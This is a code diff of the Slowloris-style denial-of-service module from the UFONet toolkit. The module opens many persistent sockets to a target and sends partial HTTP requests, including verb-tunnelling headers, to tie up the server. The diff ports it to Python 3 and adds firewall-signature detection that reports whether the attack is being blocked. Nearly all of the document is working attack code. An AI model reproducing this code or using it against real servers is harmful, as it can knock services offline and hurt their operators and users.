@@ -1,15 +1,21 @@
-#!/usr/bin/env python 
+#!/usr/bin/env python3 
 # -*- coding: utf-8 -*-"
 """
-UFONet - Denial of Service Toolkit - 2018 - by psy (epsylon@riseup.net)
+This file is part of the UFONet project, https://ufonet.03c8.net
+
+Copyright (c) 2013/2020 | psy <epsylon@riseup.net>
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import socket, random, ssl, re, urlparse
+import socket, random, ssl, re
+try:
+    from urlparse import urlparse
+except:
+    from urllib.parse import urlparse
 
-# UFONet Slow HTTP requests (LORIS)
+# UFONet Slow HTTP requests (LORIS) + [AI] WAF Detection
 def setupSocket(self, ip):
     method = random.choice(self.methods)
     port = 80
@@ -31,10 +37,10 @@ def setupSocket(self, ip):
         http_req = "POST / HTTP/1.1\r\nHost: "+str(ip)+"\r\nUser-Agent: "+str(self.user_agent)+"\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n\r\n"
     else:
         http_req = "POST / HTTP/1.1\r\nHost: "+str(ip)+"\r\nX-HTTP-Method: PUT\r\nUser-Agent: "+str(self.user_agent)+"\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n\r\n" # "Verb Tunneling Abuse" -> [RFC2616]
-    sock.sendall(http_req)
-    resp = sock.recv(1280).split("\n")
+    sock.sendall(http_req.encode('utf-8'))
+    resp = sock.recv(1280).split("\n".encode('utf-8'))
     for l in resp:
-        if "Location:" in l:
+        if "Location:".encode('utf-8') in l:
             try:
                 ip = re.findall('https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+', l)[0] # extract new redirect url
                 try:
@@ -52,6 +58,24 @@ def setupSocket(self, ip):
                        ip = target
             except:
                 pass
+        else:
+            self.wafs_file = "core/txt/wafs.txt" # set source path to retrieve 'wafs'
+            try:
+                f = open(self.wafs_file)
+                wafs = f.readlines()
+                f.close()
+            except:
+                wafs = "broken!"
+            sep = "##"
+            for w in wafs:
+                if sep in w:
+                    w = w.split(sep)
+                    signature = w[0] # signature
+                    t = w[1] # vendor
+                if signature in l.decode('utf-8'):
+                    print("[Info] [AI] [Control] FIREWALL DETECTED!! -> [" , str(t.split("\n")[0]) , "]")
+                    self.warn_flag = True
+                    return
     return sock, ip
 
 def tractor(self, ip, requests): 
@@ -61,9 +85,9 @@ def tractor(self, ip, requests):
             n=n+1
             try:
                 sock, ip = setupSocket(self, ip)
-                print "[Info] [AI] [LORIS] Firing 'tractor beam' ["+str(n)+"] -> [CONNECTED!]"
+                print("[Info] [AI] [LORIS] Firing 'tractor beam' ["+str(n)+"] -> [CONNECTED!]")
             except:
-                print "[Error] [AI] [LORIS] Failed to engage with 'tractor beam' ["+str(n)+"]"
+                print("[Error] [AI] [LORIS] Failed to engage with 'tractor beam' ["+str(n)+"]")
             self.sockets.append(sock)
         while True: # try to abuse HTTP Headers
             for sock in list(self.sockets):
@@ -77,10 +101,14 @@ def tractor(self, ip, requests):
                 if sock:
                     self.sockets.append(sock)
     except:
-        print("[Error] [AI] [LORIS] Failing to engage... -> Is still target online? -> [Checking!]")
+        if self.warn_flag == False:
+            print("[Error] [AI] [LORIS] Failing to engage... -> Is still target online? -> [Checking!]")
+        else:
+            print("[Info] [AI] [LORIS] The attack may not be effective due to the presence of a [FIREWALL] that blocks persistent connections -> [ABORTING!]")
 
 class LORIS(object):
     def __init__(self):
+        self.warn_flag = False
         self.sockets = []
         self.agents_file = 'core/txt/user-agents.txt' # set source path to retrieve user-agents
         self.agents = []
@@ -92,7 +120,7 @@ class LORIS(object):
         self.methods = ['GET', 'POST', 'X-METHOD'] # supported HTTP requests methods
 
     def attacking(self, target, requests):
-        print "[Info] [AI] Slow HTTP requests (LORIS) is ready to fire: [" , requests, "tractor beams ]"
+        print("[Info] [AI] Slow HTTP requests (LORIS) is ready to fire: [" , requests, "tractor beams ]")
         try:
             ip = socket.gethostbyname(target)
         except:
